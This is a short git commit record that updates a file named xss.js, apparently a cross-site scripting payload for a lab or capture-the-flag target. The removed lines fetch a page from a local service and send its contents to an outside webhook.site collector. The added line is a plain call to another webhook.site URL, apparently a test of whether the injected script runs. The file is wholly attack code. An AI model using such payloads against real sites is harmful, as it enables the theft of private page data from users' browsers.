3c3f4a53f75098f7ccd74e9f80d2768eb5262639
thairog <74457479+thairog@users.noreply.github.com>
2023-02-22 19:01:42 -0500

    Update xss.js

--- xss.js
+++ xss.js
@@ -1,7 +1,3 @@
 
 
-fetch("http://127.0.0.1:9000/view/129c0456-96c8-4afc-ac2c-9e21a94367d9").then((res) => {
-	return res.text();
-}).then(data => {
-	fetch("https://webhook.site/dca2f591-eb3a-47f9-8f5f-c5c2d1c0116d/a.png?data="+data);
-})
+fetch("https://webhook.site/6a4cba2c-c1a1-401c-9454-56a8c2e38531?test=testando");
